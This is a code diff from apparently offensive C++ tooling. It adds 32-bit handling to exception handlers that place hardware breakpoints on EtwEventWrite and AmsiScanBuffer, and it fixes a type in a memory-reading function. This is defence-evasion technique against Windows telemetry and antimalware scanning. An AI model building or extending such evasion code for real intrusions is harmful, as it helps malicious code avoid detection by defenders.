@@ -530,7 +530,7 @@ LONG WINAPI handlerETW(EXCEPTION_POINTERS * ExceptionInfo)
     if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
     {
         BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-
+#ifdef _WIN64
         if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
         {
             printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
@@ -545,7 +545,33 @@ LONG WINAPI handlerETW(EXCEPTION_POINTERS * ExceptionInfo)
             // continue the execution
             ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
             //ExceptionInfo->ContextRecord->Rip++;                        // or skip the breakpoint via instruction pointer
-        }        
+        }      
+#else   // ===================== X86 =======================   
+        if (ExceptionInfo->ContextRecord->Eip == (DWORD)baseAddress)
+        {
+            printf("[!] Exception (%#lx)! Params:\n",
+                   (unsigned long)ExceptionInfo->ExceptionRecord->ExceptionAddress);
+
+            DWORD esp = ExceptionInfo->ContextRecord->Esp;
+
+            // 32-bit stdcall: args are on the stack
+            DWORD param1 = *(DWORD*)(esp + 4);
+            DWORD param2 = *(DWORD*)(esp + 8);
+            DWORD param3 = *(DWORD*)(esp + 12);
+            DWORD param4 = *(DWORD*)(esp + 16);
+
+            printf("(1): %#lx | ", param1);
+            printf("(2): %#lx | ", param2);
+            printf("(3): %#lx | ", param3);
+            printf("(4): %#lx | ", param4);
+            printf("ESP = %#lx\n", (unsigned long)esp);
+
+            printf("EtwEventWrite called!\n");
+
+            // Continue execution
+            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
+        }  
+#endif
         return EXCEPTION_CONTINUE_EXECUTION;
     }
     return EXCEPTION_CONTINUE_SEARCH;
@@ -746,6 +772,7 @@ LONG WINAPI handlerAmsi(EXCEPTION_POINTERS * ExceptionInfo)
     {
         BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
 
+#ifdef _WIN64
         if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
         {
             // printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
@@ -760,7 +787,14 @@ LONG WINAPI handlerAmsi(EXCEPTION_POINTERS * ExceptionInfo)
             // continue the execution
             ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
             //ExceptionInfo->ContextRecord->Rip++;                        // or skip the breakpoint via instruction pointer
-        }        
+        }  
+#else // =========================== X86 ============================ 
+if (ExceptionInfo->ContextRecord->Eip == (DWORD64) baseAddress) 
+        {            
+            // continue the execution
+            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
+        } 
+#endif
         return EXCEPTION_CONTINUE_EXECUTION;
     }
     return EXCEPTION_CONTINUE_SEARCH;
@@ -987,7 +1021,7 @@ int Evasion::readMemory(std::string& result, const std::string& hexAddress, cons
 {
     void* address = hexStringToPointer(hexAddress);
     MEMORY_BASIC_INFORMATION mbi;
-    size_t bytesRead = 0;
+    SIZE_T bytesRead = 0;
 
     if (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
         {
